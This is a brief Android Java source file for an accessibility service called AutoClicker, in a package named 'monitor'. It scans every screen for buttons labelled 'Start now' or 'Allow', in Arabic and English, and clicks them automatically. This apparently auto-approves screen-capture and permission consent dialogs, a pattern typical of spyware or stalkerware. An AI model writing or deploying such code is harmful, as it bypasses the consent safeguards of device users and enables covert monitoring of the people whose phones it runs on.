package com.tom5.monitor;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class AutoClicker extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        // كلمات البحث للأجهزة المختلفة (عربي/إنجليزي)
        String[] targets = {"البدء الآن", "Start now", "بدء الآن", "START NOW", "السماح", "Allow"};
        for (String text : targets) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
            for (AccessibilityNodeInfo node : nodes) {
                if (node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }
                node.recycle();
            }
        }
    }
    @Override public void onInterrupt() {}
}
